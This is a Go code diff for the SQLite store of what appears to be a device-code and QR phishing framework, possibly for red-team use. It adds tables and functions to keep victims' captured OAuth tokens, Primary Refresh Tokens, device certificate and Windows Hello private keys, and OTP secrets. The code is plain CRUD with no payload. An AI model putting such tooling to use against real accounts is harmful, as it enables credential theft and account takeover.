@@ -6,6 +6,7 @@ import (
 	"database/sql"
 	"encoding/json"
 	"fmt"
+	"strings"
 	"time"
 
 	_ "modernc.org/sqlite"
@@ -88,6 +89,7 @@ func (s *Store) migrate() error {
 			upn           TEXT NOT NULL DEFAULT '',
 			redeemed_at   DATETIME NOT NULL
 		);
+		CREATE UNIQUE INDEX IF NOT EXISTS idx_tokens_campaign_target ON tokens(campaign_id, target_id);
 
 		CREATE TABLE IF NOT EXISTS email_results (
 			id           INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -121,8 +123,108 @@ func (s *Store) migrate() error {
 			redirector_url TEXT NOT NULL DEFAULT '',
 			created_at     DATETIME NOT NULL
 		);
+
+		CREATE TABLE IF NOT EXISTS users (
+			id            TEXT PRIMARY KEY,
+			username      TEXT UNIQUE NOT NULL,
+			password_hash TEXT NOT NULL,
+			salt          TEXT NOT NULL,
+			created_at    DATETIME NOT NULL
+		);
+
+		CREATE TABLE IF NOT EXISTS sessions (
+			token      TEXT PRIMARY KEY,
+			user_id    TEXT NOT NULL,
+			created_at DATETIME NOT NULL,
+			expires_at DATETIME NOT NULL
+		);
+
+		CREATE TABLE IF NOT EXISTS device_certs (
+			id            TEXT PRIMARY KEY,
+			label         TEXT NOT NULL,
+			device_id     TEXT NOT NULL,
+			join_type     INTEGER NOT NULL DEFAULT 4,
+			certificate   TEXT NOT NULL DEFAULT '',
+			private_key   TEXT NOT NULL DEFAULT '',
+			target_domain TEXT NOT NULL DEFAULT '',
+			created_at    DATETIME NOT NULL
+		);
+
+		CREATE TABLE IF NOT EXISTS primary_refresh_tokens (
+			id             TEXT PRIMARY KEY,
+			label          TEXT NOT NULL,
+			device_cert_id TEXT NOT NULL DEFAULT '',
+			prt_token      TEXT NOT NULL,
+			session_key    TEXT NOT NULL,
+			target_upn     TEXT NOT NULL DEFAULT '',
+			tenant_id      TEXT NOT NULL DEFAULT '',
+			created_at     DATETIME NOT NULL
+		);
+
+		CREATE TABLE IF NOT EXISTS winhello_keys (
+			id             TEXT PRIMARY KEY,
+			label          TEXT NOT NULL,
+			device_cert_id TEXT NOT NULL DEFAULT '',
+			key_id         TEXT NOT NULL,
+			private_key    TEXT NOT NULL,
+			target_upn     TEXT NOT NULL DEFAULT '',
+			created_at     DATETIME NOT NULL
+		);
+
+		CREATE TABLE IF NOT EXISTS otp_secrets (
+			id         TEXT PRIMARY KEY,
+			label      TEXT NOT NULL,
+			secret     TEXT NOT NULL,
+			created_at DATETIME NOT NULL
+		);
+
+		CREATE TABLE IF NOT EXISTS request_templates (
+			id         TEXT PRIMARY KEY,
+			label      TEXT NOT NULL,
+			method     TEXT NOT NULL DEFAULT 'GET',
+			uri        TEXT NOT NULL,
+			headers    TEXT NOT NULL DEFAULT '{}',
+			body       TEXT NOT NULL DEFAULT '',
+			created_at DATETIME NOT NULL
+		);
 	`)
-	return err
+	if err != nil {
+		return err
+	}
+	// QR phishing scan tracking table
+	if _, err := s.db.Exec(`
+		CREATE TABLE IF NOT EXISTS qr_scans (
+			token        TEXT PRIMARY KEY,
+			campaign_id  TEXT NOT NULL,
+			target_id    TEXT NOT NULL,
+			target_email TEXT NOT NULL,
+			created_at   DATETIME NOT NULL,
+			scanned_at   DATETIME,
+			dc_sent      INTEGER NOT NULL DEFAULT 0
+		)
+	`); err != nil {
+		return err
+	}
+
+	// Additive column migrations — ignore "duplicate column name" errors so
+	// existing databases are upgraded transparently on first run.
+	for _, alter := range []string{
+		`ALTER TABLE tokens ADD COLUMN tenant_id TEXT NOT NULL DEFAULT ''`,
+		`ALTER TABLE tokens ADD COLUMN captured_client_id TEXT NOT NULL DEFAULT ''`,
+		`ALTER TABLE campaigns ADD COLUMN qr_base_url TEXT NOT NULL DEFAULT ''`,
+		`ALTER TABLE campaigns ADD COLUMN qr_dc_template_id TEXT NOT NULL DEFAULT ''`,
+		`ALTER TABLE campaigns ADD COLUMN qr_dc_profile_id TEXT NOT NULL DEFAULT ''`,
+		`ALTER TABLE qr_scans ADD COLUMN scan_count INTEGER NOT NULL DEFAULT 0`,
+	} {
+		if _, aerr := s.db.Exec(alter); aerr != nil && !isDuplicateColumnErr(aerr) {
+			return aerr
+		}
+	}
+	return nil
+}
+
+func isDuplicateColumnErr(err error) bool {
+	return err != nil && strings.Contains(err.Error(), "duplicate column name")
 }
 
 // ─────────────────────────────────────────────
@@ -130,33 +232,38 @@ func (s *Store) migrate() error {
 // ─────────────────────────────────────────────
 
 type CampaignRow struct {
-	ID            string
-	Name          string
-	Description   string
-	Status        int
-	CreatedAt     time.Time
-	StartedAt     *time.Time
-	CompletedAt   *time.Time
-	ArtifactsPath string
-	ExportsPath   string
+	ID               string
+	Name             string
+	Description      string
+	Status           int
+	CreatedAt        time.Time
+	StartedAt        *time.Time
+	CompletedAt      *time.Time
+	ArtifactsPath    string
+	ExportsPath      string
+	QRBaseURL        string
+	QRDCTemplateID   string
+	QRDCProfileID    string
 }
 
 func (s *Store) UpsertCampaign(c CampaignRow) error {
 	_, err := s.db.Exec(`
-		INSERT INTO campaigns (id, name, description, status, created_at, started_at, completed_at, artifacts_path, exports_path)
-		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+		INSERT INTO campaigns (id, name, description, status, created_at, started_at, completed_at, artifacts_path, exports_path, qr_base_url, qr_dc_template_id, qr_dc_profile_id)
+		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
 		ON CONFLICT(id) DO UPDATE SET
 			name=excluded.name, description=excluded.description, status=excluded.status,
 			started_at=excluded.started_at, completed_at=excluded.completed_at,
-			artifacts_path=excluded.artifacts_path, exports_path=excluded.exports_path`,
+			artifacts_path=excluded.artifacts_path, exports_path=excluded.exports_path,
+			qr_base_url=excluded.qr_base_url, qr_dc_template_id=excluded.qr_dc_template_id,
+			qr_dc_profile_id=excluded.qr_dc_profile_id`,
 		c.ID, c.Name, c.Description, c.Status, c.CreatedAt, c.StartedAt, c.CompletedAt,
-		c.ArtifactsPath, c.ExportsPath,
+		c.ArtifactsPath, c.ExportsPath, c.QRBaseURL, c.QRDCTemplateID, c.QRDCProfileID,
 	)
 	return err
 }
 
 func (s *Store) LoadCampaigns() ([]CampaignRow, error) {
-	rows, err := s.db.Query(`SELECT id, name, description, status, created_at, started_at, completed_at, artifacts_path, exports_path FROM campaigns`)
+	rows, err := s.db.Query(`SELECT id, name, description, status, created_at, started_at, completed_at, artifacts_path, exports_path, qr_base_url, qr_dc_template_id, qr_dc_profile_id FROM campaigns`)
 	if err != nil {
 		return nil, err
 	}
@@ -165,7 +272,8 @@ func (s *Store) LoadCampaigns() ([]CampaignRow, error) {
 	for rows.Next() {
 		var c CampaignRow
 		if err := rows.Scan(&c.ID, &c.Name, &c.Description, &c.Status,
-			&c.CreatedAt, &c.StartedAt, &c.CompletedAt, &c.ArtifactsPath, &c.ExportsPath); err != nil {
+			&c.CreatedAt, &c.StartedAt, &c.CompletedAt, &c.ArtifactsPath, &c.ExportsPath,
+			&c.QRBaseURL, &c.QRDCTemplateID, &c.QRDCProfileID); err != nil {
 			return nil, err
 		}
 		out = append(out, c)
@@ -223,6 +331,30 @@ func (s *Store) LoadTargets(campaignID string) ([]TargetRow, error) {
 	return out, rows.Err()
 }
 
+func (s *Store) DeleteTarget(campaignID, targetID string) error {
+	tx, err := s.db.Begin()
+	if err != nil {
+		return err
+	}
+	defer tx.Rollback()
+	for _, q := range []string{
+		`DELETE FROM email_results WHERE campaign_id=? AND target_id=?`,
+		`DELETE FROM tokens WHERE campaign_id=? AND target_id=?`,
+		`DELETE FROM device_codes WHERE campaign_id=? AND target_id=?`,
+		`DELETE FROM targets WHERE campaign_id=? AND id=?`,
+	} {
+		if _, err := tx.Exec(q, campaignID, targetID); err != nil {
+			return err
+		}
+	}
+	return tx.Commit()
+}
+
+func (s *Store) DeleteDeviceCodeForTarget(campaignID, targetID string) error {
+	_, err := s.db.Exec(`DELETE FROM device_codes WHERE campaign_id=? AND target_id=?`, campaignID, targetID)
+	return err
+}
+
 // ─────────────────────────────────────────────
 // Device Codes
 // ─────────────────────────────────────────────
@@ -275,32 +407,45 @@ func (s *Store) LoadDeviceCodes(campaignID string) ([]DeviceCodeRow, error) {
 // ─────────────────────────────────────────────
 
 type TokenRow struct {
-	CampaignID   string
-	TargetID     string
-	TargetEmail  string
-	AccessToken  string
-	RefreshToken string
-	IDToken      string
-	TokenType    string
-	ExpiresIn    int
-	Scope        string
-	UPN          string
-	RedeemedAt   time.Time
+	CampaignID        string
+	TargetID          string
+	TargetEmail       string
+	AccessToken       string
+	RefreshToken      string
+	IDToken           string
+	TokenType         string
+	ExpiresIn         int
+	Scope             string
+	UPN               string
+	RedeemedAt        time.Time
+	TenantID          string // extracted from JWT tid claim
+	CapturedClientID  string // extracted from JWT appid/azp claim
 }
 
 func (s *Store) InsertToken(t TokenRow) error {
 	_, err := s.db.Exec(`
-		INSERT INTO tokens (campaign_id, target_id, target_email, access_token, refresh_token, id_token, token_type, expires_in, scope, upn, redeemed_at)
-		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+		INSERT INTO tokens (campaign_id, target_id, target_email, access_token, refresh_token, id_token, token_type, expires_in, scope, upn, redeemed_at, tenant_id, captured_client_id)
+		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+		ON CONFLICT(campaign_id, target_id) DO UPDATE SET
+			access_token=excluded.access_token,
+			refresh_token=excluded.refresh_token,
+			id_token=excluded.id_token,
+			token_type=excluded.token_type,
+			expires_in=excluded.expires_in,
+			scope=excluded.scope,
+			upn=excluded.upn,
+			redeemed_at=excluded.redeemed_at,
+			tenant_id=excluded.tenant_id,
+			captured_client_id=excluded.captured_client_id`,
 		t.CampaignID, t.TargetID, t.TargetEmail, t.AccessToken, t.RefreshToken, t.IDToken,
-		t.TokenType, t.ExpiresIn, t.Scope, t.UPN, t.RedeemedAt,
+		t.TokenType, t.ExpiresIn, t.Scope, t.UPN, t.RedeemedAt, t.TenantID, t.CapturedClientID,
 	)
 	return err
 }
 
 func (s *Store) LoadTokenByTargetID(campaignID, targetID string) (*TokenRow, error) {
 	rows, err := s.db.Query(`
-		SELECT campaign_id, target_id, target_email, access_token, refresh_token, id_token, token_type, expires_in, scope, upn, redeemed_at
+		SELECT campaign_id, target_id, target_email, access_token, refresh_token, id_token, token_type, expires_in, scope, upn, redeemed_at, tenant_id, captured_client_id
 		FROM tokens WHERE campaign_id=? AND target_id=? ORDER BY redeemed_at DESC LIMIT 1`,
 		campaignID, targetID)
 	if err != nil {
@@ -312,7 +457,8 @@ func (s *Store) LoadTokenByTargetID(campaignID, targetID string) (*TokenRow, err
 	}
 	var t TokenRow
 	if err := rows.Scan(&t.CampaignID, &t.TargetID, &t.TargetEmail, &t.AccessToken, &t.RefreshToken,
-		&t.IDToken, &t.TokenType, &t.ExpiresIn, &t.Scope, &t.UPN, &t.RedeemedAt); err != nil {
+		&t.IDToken, &t.TokenType, &t.ExpiresIn, &t.Scope, &t.UPN, &t.RedeemedAt,
+		&t.TenantID, &t.CapturedClientID); err != nil {
 		return nil, err
 	}
 	return &t, rows.Err()
@@ -328,7 +474,7 @@ func (s *Store) UpdateLatestToken(campaignID, targetID, accessToken, refreshToke
 }
 
 func (s *Store) LoadTokens(campaignID string) ([]TokenRow, error) {
-	rows, err := s.db.Query(`SELECT campaign_id, target_id, target_email, access_token, refresh_token, id_token, token_type, expires_in, scope, upn, redeemed_at FROM tokens WHERE campaign_id=?`, campaignID)
+	rows, err := s.db.Query(`SELECT campaign_id, target_id, target_email, access_token, refresh_token, id_token, token_type, expires_in, scope, upn, redeemed_at, tenant_id, captured_client_id FROM tokens WHERE campaign_id=?`, campaignID)
 	if err != nil {
 		return nil, err
 	}
@@ -337,7 +483,8 @@ func (s *Store) LoadTokens(campaignID string) ([]TokenRow, error) {
 	for rows.Next() {
 		var t TokenRow
 		if err := rows.Scan(&t.CampaignID, &t.TargetID, &t.TargetEmail, &t.AccessToken, &t.RefreshToken,
-			&t.IDToken, &t.TokenType, &t.ExpiresIn, &t.Scope, &t.UPN, &t.RedeemedAt); err != nil {
+			&t.IDToken, &t.TokenType, &t.ExpiresIn, &t.Scope, &t.UPN, &t.RedeemedAt,
+			&t.TenantID, &t.CapturedClientID); err != nil {
 			return nil, err
 		}
 		out = append(out, t)
@@ -563,6 +710,420 @@ func orEmpty[T any](s []T) []T {
 	}
 	return s
 }
-func orEmptyDC(s []DeviceCodeRow) []DeviceCodeRow  { return orEmpty(s) }
-func orEmptyTok(s []TokenRow) []TokenRow           { return orEmpty(s) }
-func orEmptyER(s []EmailResultRow) []EmailResultRow { return orEmpty(s) }
+func orEmptyDC(s []DeviceCodeRow) []DeviceCodeRow   { return orEmpty(s) }
+func orEmptyTok(s []TokenRow) []TokenRow             { return orEmpty(s) }
+func orEmptyER(s []EmailResultRow) []EmailResultRow  { return orEmpty(s) }
+
+// ─────────────────────────────────────────────
+// Users
+// ─────────────────────────────────────────────
+
+type UserRow struct {
+	ID           string
+	Username     string
+	PasswordHash string
+	Salt         string
+	CreatedAt    time.Time
+}
+
+func (s *Store) CreateUser(id, username, passwordHash, salt string) error {
+	_, err := s.db.Exec(
+		`INSERT INTO users (id, username, password_hash, salt, created_at) VALUES (?, ?, ?, ?, ?)`,
+		id, username, passwordHash, salt, time.Now().UTC(),
+	)
+	return err
+}
+
+func (s *Store) GetUserByUsername(username string) (*UserRow, error) {
+	row := s.db.QueryRow(
+		`SELECT id, username, password_hash, salt, created_at FROM users WHERE username=?`, username)
+	var u UserRow
+	if err := row.Scan(&u.ID, &u.Username, &u.PasswordHash, &u.Salt, &u.CreatedAt); err != nil {
+		if err.Error() == "sql: no rows in result set" {
+			return nil, nil
+		}
+		return nil, err
+	}
+	return &u, nil
+}
+
+func (s *Store) CountUsers() (int, error) {
+	var n int
+	err := s.db.QueryRow(`SELECT COUNT(*) FROM users`).Scan(&n)
+	return n, err
+}
+
+// ─────────────────────────────────────────────
+// Sessions
+// ─────────────────────────────────────────────
+
+type SessionRow struct {
+	Token     string
+	UserID    string
+	CreatedAt time.Time
+	ExpiresAt time.Time
+}
+
+func (s *Store) CreateSession(token, userID string, expiresAt time.Time) error {
+	_, err := s.db.Exec(
+		`INSERT INTO sessions (token, user_id, created_at, expires_at) VALUES (?, ?, ?, ?)`,
+		token, userID, time.Now().UTC(), expiresAt,
+	)
+	return err
+}
+
+func (s *Store) GetSession(token string) (*SessionRow, error) {
+	row := s.db.QueryRow(
+		`SELECT token, user_id, created_at, expires_at FROM sessions WHERE token=?`, token)
+	var sess SessionRow
+	if err := row.Scan(&sess.Token, &sess.UserID, &sess.CreatedAt, &sess.ExpiresAt); err != nil {
+		if err.Error() == "sql: no rows in result set" {
+			return nil, nil
+		}
+		return nil, err
+	}
+	return &sess, nil
+}
+
+func (s *Store) DeleteSession(token string) error {
+	_, err := s.db.Exec(`DELETE FROM sessions WHERE token=?`, token)
+	return err
+}
+
+func (s *Store) CleanupSessions() error {
+	_, err := s.db.Exec(`DELETE FROM sessions WHERE expires_at < ?`, time.Now().UTC())
+	return err
+}
+
+// ─────────────────────────────────────────────
+// Device Certificates
+// ─────────────────────────────────────────────
+
+type DeviceCertRow struct {
+	ID           string
+	Label        string
+	DeviceID     string
+	JoinType     int
+	Certificate  string
+	PrivateKey   string
+	TargetDomain string
+	CreatedAt    time.Time
+}
+
+func (s *Store) InsertDeviceCert(r DeviceCertRow) error {
+	_, err := s.db.Exec(`INSERT INTO device_certs (id,label,device_id,join_type,certificate,private_key,target_domain,created_at) VALUES (?,?,?,?,?,?,?,?)`,
+		r.ID, r.Label, r.DeviceID, r.JoinType, r.Certificate, r.PrivateKey, r.TargetDomain, r.CreatedAt)
+	return err
+}
+
+func (s *Store) ListDeviceCerts() ([]DeviceCertRow, error) {
+	rows, err := s.db.Query(`SELECT id,label,device_id,join_type,certificate,private_key,target_domain,created_at FROM device_certs ORDER BY created_at DESC`)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+	var out []DeviceCertRow
+	for rows.Next() {
+		var r DeviceCertRow
+		if err := rows.Scan(&r.ID, &r.Label, &r.DeviceID, &r.JoinType, &r.Certificate, &r.PrivateKey, &r.TargetDomain, &r.CreatedAt); err != nil {
+			return nil, err
+		}
+		out = append(out, r)
+	}
+	return out, rows.Err()
+}
+
+func (s *Store) GetDeviceCert(id string) (*DeviceCertRow, error) {
+	row := s.db.QueryRow(`SELECT id,label,device_id,join_type,certificate,private_key,target_domain,created_at FROM device_certs WHERE id=?`, id)
+	var r DeviceCertRow
+	if err := row.Scan(&r.ID, &r.Label, &r.DeviceID, &r.JoinType, &r.Certificate, &r.PrivateKey, &r.TargetDomain, &r.CreatedAt); err != nil {
+		return nil, err
+	}
+	return &r, nil
+}
+
+func (s *Store) DeleteDeviceCert(id string) error {
+	_, err := s.db.Exec(`DELETE FROM device_certs WHERE id=?`, id)
+	return err
+}
+
+// ─────────────────────────────────────────────
+// Primary Refresh Tokens
+// ─────────────────────────────────────────────
+
+type PRTRow struct {
+	ID           string
+	Label        string
+	DeviceCertID string
+	PRTToken     string
+	SessionKey   string
+	TargetUPN    string
+	TenantID     string
+	CreatedAt    time.Time
+}
+
+func (s *Store) InsertPRT(r PRTRow) error {
+	_, err := s.db.Exec(`INSERT INTO primary_refresh_tokens (id,label,device_cert_id,prt_token,session_key,target_upn,tenant_id,created_at) VALUES (?,?,?,?,?,?,?,?)`,
+		r.ID, r.Label, r.DeviceCertID, r.PRTToken, r.SessionKey, r.TargetUPN, r.TenantID, r.CreatedAt)
+	return err
+}
+
+func (s *Store) ListPRTs() ([]PRTRow, error) {
+	rows, err := s.db.Query(`SELECT id,label,device_cert_id,prt_token,session_key,target_upn,tenant_id,created_at FROM primary_refresh_tokens ORDER BY created_at DESC`)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+	var out []PRTRow
+	for rows.Next() {
+		var r PRTRow
+		if err := rows.Scan(&r.ID, &r.Label, &r.DeviceCertID, &r.PRTToken, &r.SessionKey, &r.TargetUPN, &r.TenantID, &r.CreatedAt); err != nil {
+			return nil, err
+		}
+		out = append(out, r)
+	}
+	return out, rows.Err()
+}
+
+func (s *Store) GetPRT(id string) (*PRTRow, error) {
+	row := s.db.QueryRow(`SELECT id,label,device_cert_id,prt_token,session_key,target_upn,tenant_id,created_at FROM primary_refresh_tokens WHERE id=?`, id)
+	var r PRTRow
+	if err := row.Scan(&r.ID, &r.Label, &r.DeviceCertID, &r.PRTToken, &r.SessionKey, &r.TargetUPN, &r.TenantID, &r.CreatedAt); err != nil {
+		return nil, err
+	}
+	return &r, nil
+}
+
+func (s *Store) DeletePRT(id string) error {
+	_, err := s.db.Exec(`DELETE FROM primary_refresh_tokens WHERE id=?`, id)
+	return err
+}
+
+// ─────────────────────────────────────────────
+// WinHello Keys
+// ─────────────────────────────────────────────
+
+type WinHelloKeyRow struct {
+	ID           string
+	Label        string
+	DeviceCertID string
+	KeyID        string
+	PrivateKey   string
+	TargetUPN    string
+	CreatedAt    time.Time
+}
+
+func (s *Store) InsertWinHelloKey(r WinHelloKeyRow) error {
+	_, err := s.db.Exec(`INSERT INTO winhello_keys (id,label,device_cert_id,key_id,private_key,target_upn,created_at) VALUES (?,?,?,?,?,?,?)`,
+		r.ID, r.Label, r.DeviceCertID, r.KeyID, r.PrivateKey, r.TargetUPN, r.CreatedAt)
+	return err
+}
+
+func (s *Store) ListWinHelloKeys() ([]WinHelloKeyRow, error) {
+	rows, err := s.db.Query(`SELECT id,label,device_cert_id,key_id,private_key,target_upn,created_at FROM winhello_keys ORDER BY created_at DESC`)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+	var out []WinHelloKeyRow
+	for rows.Next() {
+		var r WinHelloKeyRow
+		if err := rows.Scan(&r.ID, &r.Label, &r.DeviceCertID, &r.KeyID, &r.PrivateKey, &r.TargetUPN, &r.CreatedAt); err != nil {
+			return nil, err
+		}
+		out = append(out, r)
+	}
+	return out, rows.Err()
+}
+
+func (s *Store) DeleteWinHelloKey(id string) error {
+	_, err := s.db.Exec(`DELETE FROM winhello_keys WHERE id=?`, id)
+	return err
+}
+
+// ─────────────────────────────────────────────
+// OTP Secrets
+// ─────────────────────────────────────────────
+
+type OTPSecretRow struct {
+	ID        string
+	Label     string
+	Secret    string
+	CreatedAt time.Time
+}
+
+func (s *Store) InsertOTPSecret(r OTPSecretRow) error {
+	_, err := s.db.Exec(`INSERT INTO otp_secrets (id,label,secret,created_at) VALUES (?,?,?,?)`,
+		r.ID, r.Label, r.Secret, r.CreatedAt)
+	return err
+}
+
+func (s *Store) ListOTPSecrets() ([]OTPSecretRow, error) {
+	rows, err := s.db.Query(`SELECT id,label,secret,created_at FROM otp_secrets ORDER BY created_at DESC`)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+	var out []OTPSecretRow
+	for rows.Next() {
+		var r OTPSecretRow
+		if err := rows.Scan(&r.ID, &r.Label, &r.Secret, &r.CreatedAt); err != nil {
+			return nil, err
+		}
+		out = append(out, r)
+	}
+	return out, rows.Err()
+}
+
+func (s *Store) DeleteOTPSecret(id string) error {
+	_, err := s.db.Exec(`DELETE FROM otp_secrets WHERE id=?`, id)
+	return err
+}
+
+// ─────────────────────────────────────────────
+// Request Templates
+// ─────────────────────────────────────────────
+
+type RequestTemplateRow struct {
+	ID        string
+	Label     string
+	Method    string
+	URI       string
+	Headers   string
+	Body      string
+	CreatedAt time.Time
+}
+
+func (s *Store) InsertRequestTemplate(r RequestTemplateRow) error {
+	_, err := s.db.Exec(`INSERT INTO request_templates (id,label,method,uri,headers,body,created_at) VALUES (?,?,?,?,?,?,?)`,
+		r.ID, r.Label, r.Method, r.URI, r.Headers, r.Body, r.CreatedAt)
+	return err
+}
+
+func (s *Store) ListRequestTemplates() ([]RequestTemplateRow, error) {
+	rows, err := s.db.Query(`SELECT id,label,method,uri,headers,body,created_at FROM request_templates ORDER BY created_at DESC`)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+	var out []RequestTemplateRow
+	for rows.Next() {
+		var r RequestTemplateRow
+		if err := rows.Scan(&r.ID, &r.Label, &r.Method, &r.URI, &r.Headers, &r.Body, &r.CreatedAt); err != nil {
+			return nil, err
+		}
+		out = append(out, r)
+	}
+	return out, rows.Err()
+}
+
+func (s *Store) DeleteRequestTemplate(id string) error {
+	_, err := s.db.Exec(`DELETE FROM request_templates WHERE id=?`, id)
+	return err
+}
+
+// ─────────────────────────────────────────────
+// QR Scan Tracking
+// ─────────────────────────────────────────────
+
+type QRScanRow struct {
+	Token       string     `json:"token"`
+	CampaignID  string     `json:"campaign_id"`
+	TargetID    string     `json:"target_id"`
+	TargetEmail string     `json:"target_email"`
+	CreatedAt   time.Time  `json:"created_at"`
+	ScannedAt   *time.Time `json:"scanned_at"`
+	DCSent      bool       `json:"dc_sent"`
+	ScanCount   int        `json:"scan_count"`
+}
+
+func (s *Store) UpsertQRScan(r QRScanRow) error {
+	_, err := s.db.Exec(`
+		INSERT INTO qr_scans (token, campaign_id, target_id, target_email, created_at, scanned_at, dc_sent, scan_count)
+		VALUES (?, ?, ?, ?, ?, ?, ?, 0)
+		ON CONFLICT(token) DO UPDATE SET
+			scanned_at=excluded.scanned_at, dc_sent=excluded.dc_sent`,
+		r.Token, r.CampaignID, r.TargetID, r.TargetEmail, r.CreatedAt, r.ScannedAt, boolToInt(r.DCSent),
+	)
+	return err
+}
+
+func (s *Store) GetQRScan(token string) (*QRScanRow, error) {
+	row := s.db.QueryRow(`
+		SELECT token, campaign_id, target_id, target_email, created_at, scanned_at, dc_sent, scan_count
+		FROM qr_scans WHERE token=?`, token)
+	var r QRScanRow
+	var dcSent, scanCount int
+	var scannedAt *string // scan as string to avoid *time.Time NULL parsing issues
+	if err := row.Scan(&r.Token, &r.CampaignID, &r.TargetID, &r.TargetEmail, &r.CreatedAt, &scannedAt, &dcSent, &scanCount); err != nil {
+		if err.Error() == "sql: no rows in result set" {
+			return nil, nil
+		}
+		return nil, err
+	}
+	r.DCSent = dcSent != 0
+	r.ScanCount = scanCount
+	if scannedAt != nil {
+		t, _ := time.Parse(time.RFC3339Nano, *scannedAt)
+		if t.IsZero() {
+			t, _ = time.Parse("2006-01-02T15:04:05Z", *scannedAt)
+		}
+		if !t.IsZero() {
+			r.ScannedAt = &t
+		}
+	}
+	return &r, nil
+}
+
+// MarkQRScanned records the scan timestamp and increments the scan counter.
+func (s *Store) MarkQRScanned(token string, at time.Time) error {
+	_, err := s.db.Exec(
+		`UPDATE qr_scans SET scanned_at=?, scan_count=scan_count+1 WHERE token=?`,
+		at, token,
+	)
+	return err
+}
+
+func (s *Store) MarkQRDCSent(token string) error {
+	_, err := s.db.Exec(`UPDATE qr_scans SET dc_sent=1 WHERE token=?`, token)
+	return err
+}
+
+func (s *Store) ListQRScans(campaignID string) ([]QRScanRow, error) {
+	rows, err := s.db.Query(`
+		SELECT token, campaign_id, target_id, target_email, created_at, scanned_at, dc_sent, scan_count
+		FROM qr_scans WHERE campaign_id=? ORDER BY created_at DESC`, campaignID)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+	var out []QRScanRow
+	for rows.Next() {
+		var r QRScanRow
+		var dcSent, scanCount int
+		var scannedAt *string
+		if err := rows.Scan(&r.Token, &r.CampaignID, &r.TargetID, &r.TargetEmail, &r.CreatedAt, &scannedAt, &dcSent, &scanCount); err != nil {
+			return nil, err
+		}
+		r.DCSent = dcSent != 0
+		r.ScanCount = scanCount
+		if scannedAt != nil {
+			t, _ := time.Parse(time.RFC3339Nano, *scannedAt)
+			if t.IsZero() {
+				t, _ = time.Parse("2006-01-02T15:04:05Z", *scannedAt)
+			}
+			if !t.IsZero() {
+				r.ScannedAt = &t
+			}
+		}
+		out = append(out, r)
+	}
+	return out, rows.Err()
+}
+
+func boolToInt(b bool) int {
+	if b {
+		return 1
+	}
+	return 0
+}
